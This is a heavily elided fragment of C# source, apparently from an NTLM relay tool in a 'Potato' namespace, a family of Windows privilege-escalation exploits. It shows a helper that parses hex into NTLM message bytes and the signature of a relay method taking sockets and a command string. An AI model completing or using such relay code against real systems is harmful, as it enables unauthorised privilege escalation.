...
namespace Potato
{
    class NTLMRelayingProxy
    {
        ...
        private static byte[] NTLMExtract(byte[] buf)
        {
            try
            {
                ...
                if (m.Value.Length != 0)
                {
                    ...
                    {
                        byte_array[i] = Convert.ToByte(arr[i], 16);
                    }
                    return byte_array;
                }
                return null;
        ...
        public void startRelay(Socket targetSock, Socket winRpcSock, Queue<byte[]> ntlmQueue, bool dropFirst, String enable_token, String cmd)
        {
